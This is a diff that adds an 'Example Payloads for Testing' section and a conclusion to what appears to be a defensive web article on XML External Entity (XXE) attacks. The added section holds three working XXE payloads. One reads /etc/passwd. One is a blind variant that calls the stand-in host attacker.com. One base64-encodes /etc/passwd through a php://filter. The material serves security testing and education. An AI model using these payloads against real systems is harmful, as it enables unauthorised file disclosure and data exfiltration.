@@ -81,3 +81,29 @@ echo $dom->saveXML();
     <li>Validate XML Input: Allow only expected content.</li>
 </ul>
 </section>
+
+Example Payloads for Testing
+
+Here are example payloads to identify XXE vulnerabilities:
+
+Basic XXE Payload:
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<foo>&xxe;</foo>
+
+Blind XXE Payload:
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/xxe.xml"> ]>
+<foo>&xxe;</foo>
+
+XXE with PHP Filters:
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
+<foo>&xxe;</foo>
+
+<h2>Conclusion</h2>
+
+<p>XML External Entity (XXE) attacks exploit vulnerabilities in XML parsers to access sensitive information, perform SSRF, or execute malicious code. Detecting and preventing these attacks is crucial for securing web applications. By disabling external entities, validating input, using secure parsers, and analyzing logs for suspicious patterns, developers and security teams can protect their systems from XXE threats. Regular security assessments and adopting secure coding practices further enhance defense against XXE vulnerabilities.</p>
